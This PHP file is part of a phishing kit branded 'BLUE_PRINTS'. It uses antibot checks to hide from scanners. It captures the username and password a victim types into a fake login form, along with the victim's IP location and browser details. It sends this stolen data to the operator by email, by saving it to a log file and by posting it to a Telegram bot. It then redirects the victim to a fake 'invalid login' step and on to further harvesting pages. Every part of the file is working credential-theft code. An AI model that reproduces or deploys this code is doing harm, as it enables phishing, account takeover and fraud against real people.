<?php 
	session_start();
	require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
	include '../../crawlerdetect.php';
	        // variable declaration
	        $errors = array(); 

	          
	          if (isset($_POST['invalid']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
				  $settings = include '../conf/settings.php';
                  $omlj  = $_POST['omlj'];
                  $_SESSION['omlj'] = $omlj;
                  $pass 	  = $_POST['dsfsd'];
                  $_SESSION['pass'] = $pass;

    
    $body = ":::::::::: BLUE_PRINTS 1nf0 [User Details] ::::::::::::::\r\n";
    $body .= "Username                         : {$_SESSION['omlj']}\r\n";
    $body .= "pass                             : {$_SESSION['pass']}\r\n";
    $body .=  "|--------------- I N F O | I P -------------------|\r\n";
    $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
    $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
    $body .= "IP City	                           : {$_SESSION['city']}\r\n";
    $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
    $body .= ":::::::::::::::::  BLUE_PRINTS 1nf0 ::::::::::::::::::::::\r\n";
    if($savetxt == "on"){
    $save=fopen("../data/login".$salt.".txt",'a');
    fwrite($save,$body);
    fclose($save);
    }

    $subject = "Login Details By BLUE_PRINTS | IP {$_SESSION['ip']}";
    $headers="From: Blue_Prints <blue_prints@BO4.com>\r\n";
    $headers.="MIME-Version: 1.0\r\n";
    $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($emailzz, $subject, $body, $headers);  
	if($tgresult == "on"){
		$data = $body;
		  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
		  $website = "https://api.telegram.org/{$settings['bot_url']}";
		  $ch = curl_init($website . '/sendMessage');
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		  curl_setopt($ch, CURLOPT_POST, 1);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  $result = curl_exec($ch);
		  curl_close($ch);
	  }
	          	$key = $_SESSION['token'];
                  if($emailpage == "on"){
					echo "<script>window.location.href='../../email_identity.php?token=".$key."';</script>";
					die();}else{
                        echo "<script>window.location.href='../../security.php?token=".$key."';</script>";
                        die(); 
                    }
				  
	          }

	          if (isset($_POST['omlj']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
				  $settings = include '../conf/settings.php';
	          // check for valid email address
              $omlj  = $_POST['omlj'];
              $_SESSION['omlj'] = $omlj;
              $pass 	  = $_POST['dsfsd'];
              $_SESSION['pass'] = $pass;
          
                   $body = ":::::::::: BLUE_PRINTS 1nf0 [User Details] ::::::::::::::\r\n";
                   $body .= "Username                         : {$_SESSION['omlj']}\r\n";
                   $body .= "pass                             : {$_SESSION['pass']}\r\n";
                   $body .=  "|--------------- I N F O | I P -------------------|\r\n";
                   $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
                   $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
                   $body .= "IP City	                           : {$_SESSION['city']}\r\n";
                   $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
                   $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
                   $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
                   $body .= ":::::::::::::  BLUE_PRINTS 1nf0 ::::::::::::::\r\n";
                   if($savetxt == "on"){
                   $save=fopen("../data/login".$salt.".txt",'a');
                   fwrite($save,$body);
                   fclose($save);
                   }
          
                   $subject = "Login Details By BLUE_PRINTS | IP {$_SESSION['ip']}";
                   $headers="From: Blue_Prints <blue_prints@BO4.com>\r\n";
                   $headers.="MIME-Version: 1.0\r\n";
                   $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
                  @mail($emailzz, $subject, $body, $headers); 
				  if($tgresult == "on"){
					$data = $body;
					  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
					  $website = "https://api.telegram.org/{$settings['bot_url']}";
					  $ch = curl_init($website . '/sendMessage');
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_POST, 1);
					  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					  $result = curl_exec($ch);
					  curl_close($ch);
				  }
	          	$key = $_SESSION['token'];
	          	echo "<script>window.location.href='../../access.php?invalid&token=".$key."';</script>";
	          	die();
	          }
	          
              ?>